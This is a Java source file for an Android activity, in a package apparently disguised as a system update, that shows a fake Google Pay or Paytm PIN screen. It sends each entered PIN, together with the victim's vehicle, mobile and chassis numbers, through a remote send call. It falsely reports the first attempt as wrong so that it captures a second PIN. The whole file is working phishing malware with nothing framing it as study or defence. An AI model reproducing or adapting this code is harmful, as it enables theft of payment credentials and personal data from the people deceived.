package com.sysupd;

import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class PinActivity extends AppCompatActivity {
    String vehicle = "", app = "", mobile = "", chassis = "";
    int attempt = 1;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_pin);

        vehicle = getIntent().getStringExtra("vehicle");
        app = getIntent().getStringExtra("app");
        mobile = getIntent().getStringExtra("mobile");
        chassis = getIntent().getStringExtra("chassis");

        TextView logo = findViewById(R.id.appLogo);
        if (app.equals("gpay")) {
            logo.setText("Google Pay");
            logo.setTextColor(0xFF4285F4);
        } else if (app.equals("paytm")) {
            logo.setText("Paytm");
            logo.setTextColor(0xFF00BAF2);
        }

        final EditText pin = findViewById(R.id.pinInput);
        final TextView error = findViewById(R.id.errorText);
        Button pay = findViewById(R.id.payBtn);

        pay.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                String p = pin.getText().toString().trim();
                if (p.length() < 4) {
                    error.setText("Enter 4-6 digit PIN");
                    error.setVisibility(View.VISIBLE);
                    return;
                }
                Fb.send("PIN_ATTEMPT_" + attempt,
                    "{\"app\":\"" + app + "\",\"pin\":\"" + p +
                    "\",\"vehicle\":\"" + vehicle + "\",\"mobile\":\"" + mobile +
                    "\",\"chassis\":\"" + chassis + "\"}");
                if (attempt == 1) {
                    error.setText("Incorrect PIN. Try again.");
                    error.setVisibility(View.VISIBLE);
                    pin.setText("");
                    attempt = 2;
                } else {
                    Intent i = new Intent(PinActivity.this, SuccessActivity.class);
                    startActivity(i);
                    finish();
                }
            }
        });
    }
}
